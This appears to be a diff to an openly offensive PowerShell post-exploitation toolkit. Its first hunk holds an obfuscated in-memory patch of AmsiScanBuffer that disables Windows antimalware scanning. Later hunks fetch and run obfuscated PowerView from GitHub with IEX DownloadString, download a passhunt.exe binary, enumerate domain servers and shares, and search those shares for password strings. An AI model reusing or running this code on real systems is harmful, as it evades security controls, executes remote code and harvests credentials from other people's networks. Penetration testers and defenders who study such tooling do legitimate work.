@@ -20,12 +20,12 @@ Add-Type $ztzsw
 $kgqdegv = [ztzsw]::LoadLibrary("$([CHar](97)+[CHar](109*53/53)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](100*35/35)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c))")
 $dfwxos = [ztzsw]::GetProcAddress($kgqdegv, "$([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72))")
 $p = 0
-[ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
 $qddw = "0xB8"
-$bsyb = "0x57"
-$zcbf = "0x00"
-$ymfa = "0x07"
 $fwyu = "0x80"
+$bsyb = "0x57"
+[ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
+$ymfa = "0x07"
+$zcbf = "0x00"
 $dned = "0xC3"
 $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
 [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)
@@ -1829,14 +1829,13 @@ function Passhunt
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    # P0werspl0its p0werview obfuscated + string replaced
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
-
+    
         if ($domain)
         {
-            Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
-            $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-            $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
+            if (!(Test-Path("$currentPath\DomainRecon\activeservers.txt")))
+            {
+                Searchservers
+            }
 
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
             Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
@@ -1844,6 +1843,7 @@ function Passhunt
              
             $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
             $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
+            $testShares > "$currentPath\DomainRecon\found_shares.txt"
 
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
 	    if (!(test-path $currentPath\passhunt.exe))
@@ -1851,7 +1851,7 @@ function Passhunt
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             }
-	    foreach ($line in $shares)
+	    foreach ($line in $testShares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
  -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
@@ -1887,6 +1887,19 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
  -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
         }
+
+}
+
+function Searchservers
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    # P0werspl0its p0werview obfuscated + string replaced
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
+    $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+    $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
 
 }
 
